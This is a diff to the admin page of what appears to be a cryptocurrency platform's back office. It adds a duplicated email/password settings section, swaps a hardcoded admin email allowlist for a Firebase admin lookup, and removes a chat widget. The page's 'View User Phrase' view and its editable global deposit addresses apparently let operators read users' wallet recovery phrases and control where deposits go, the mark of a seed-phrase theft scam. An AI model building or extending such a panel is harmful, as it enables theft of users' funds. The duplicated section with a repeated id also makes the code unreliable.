@@ -75,6 +75,7 @@
         <div class="nav-item" onclick="switchView('transactions')"><span>💵</span> Transactions</div>
         <div class="nav-item" onclick="switchView('phrases')"><span>🔑</span> View User Phrase</div>
         <div class="nav-item" onclick="switchView('wallets')"><span>💳</span> Wallets</div>
+        <div class="nav-item" onclick="switchView('settings')"><span>⚙️</span> Change Email/Password</div>
         <div class="nav-item" style="margin-top:auto; color:#e11d48;" onclick="handleLogout()"><span>🚪</span> Logout</div>
     </aside>
 
@@ -167,23 +168,44 @@
             <button class="btn btn-primary" style="margin-top:20px" onclick="saveGlobalAddresses()">Save Global Addresses</button>
         </section>
 
+        <section id="view-settings" class="view-section">
+            <h1>Admin Settings</h1>
+
+            <div class="card" style="max-width:500px;">
+                <label>New Email</label>
+                <input type="email" id="new-admin-email">
+
+                <label style="margin-top:15px;">New Password</label>
+                <input type="password" id="new-admin-password">
+
+                <button class="btn btn-primary" style="margin-top:20px;" onclick="updateAdminAuth()">
+                    Update Credentials
+                </button>
+            </div>
+        </section>
+
+        <section id="view-settings" class="view-section">
+            <h1>Admin Settings</h1>
+
+            <div class="card" style="max-width:500px;">
+                <label>New Email</label>
+                <input type="email" id="new-email">
+
+                <label style="margin-top:15px;">New Password</label>
+                <input type="password" id="new-password">
+
+                <button class="btn btn-primary" style="margin-top:20px;" onclick="updateAdminAccount()">
+                    Update Account
+                </button>
+            </div>
+        </section>
+
     </main>
 
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/69e270d31dd97e1c38bed8fb/1jme8hfat';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
+
 <!--End of Tawk.to Script-->
     <script>
 // 1. Authorized Admin List
@@ -264,6 +286,41 @@ async function loadAdminPrices() {
         // --- USERS & BALANCES ---
 // Ensure this exists at the top of your script
  
+auth.onAuthStateChanged(async (user) => {
+    if (!user) {
+        window.location.href = "admin-login.html";
+        return;
+    }
+
+    const snap = await db.ref('admins/' + user.uid).once('value');
+
+    if (!snap.exists()) {
+        alert("Access denied");
+        auth.signOut();
+        window.location.href = "admin-login.html";
+        return;
+    }
+
+    // Access granted
+    document.body.style.display = "flex";
+    loadUsers();
+});
+
+async function updateAdminAccount() {
+    const email = document.getElementById('new-email').value;
+    const password = document.getElementById('new-password').value;
+
+    try {
+        const user = auth.currentUser;
+
+        if (email) await user.updateEmail(email);
+        if (password) await user.updatePassword(password);
+
+        alert("Updated successfully!");
+    } catch (e) {
+        alert("Error: " + e.message);
+    }
+}
 
 async function loadUsers() {
     const tbody = document.getElementById('user-table-body');
@@ -584,20 +641,7 @@ function loadPhrases() {
         }
         
         // Add this inside the script tag in admin.html
-auth.onAuthStateChanged((user) => {
-    const authorizedAdmins = ["unveilingnight@gmail.com", "revoutpay@gmail.com"];
-    
-    if (!user || !authorizedAdmins.includes(user.email.toLowerCase())) {
-        // Not logged in OR not an admin -> GET OUT
-        window.location.href = "index.html"; 
-    } else {
-        // Access Granted
-        console.log("Admin Verified:", user.email);
-        document.body.style.display = "flex"; // Show the page
-        loadUsers(); // Start loading your admin data
-    }
-});
-        // --- GLOBAL WALLETS ---
+      // --- GLOBAL WALLETS ---
         function loadGlobalAddresses() {
             const grid = document.getElementById('global-address-grid');
             db.ref('settings/deposit_addresses').once('value', snap => {
